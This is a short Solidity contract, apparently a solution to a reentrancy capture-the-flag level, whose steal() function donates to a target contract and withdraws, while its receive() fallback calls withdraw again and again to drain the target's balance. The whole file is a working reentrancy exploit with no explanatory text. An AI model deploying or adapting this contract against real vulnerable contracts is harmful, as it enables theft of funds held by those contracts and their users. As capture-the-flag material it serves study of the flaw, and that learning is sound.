// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface ReentranceInterface {
    function withdraw(uint) external ;
    function donate(address) external payable ;
}
contract Reentrance {
    function steal(address addr) public payable {
        ReentranceInterface(addr).donate{value:msg.value}(address(this));
        ReentranceInterface(addr).withdraw(msg.value);
    }
    receive() external payable {
        if (msg.sender.balance >= msg.value) {
            ReentranceInterface(msg.sender).withdraw(msg.value);
        } else if (msg.sender.balance > 0) {
            ReentranceInterface(msg.sender).withdraw(msg.sender.balance);
        }
    }
}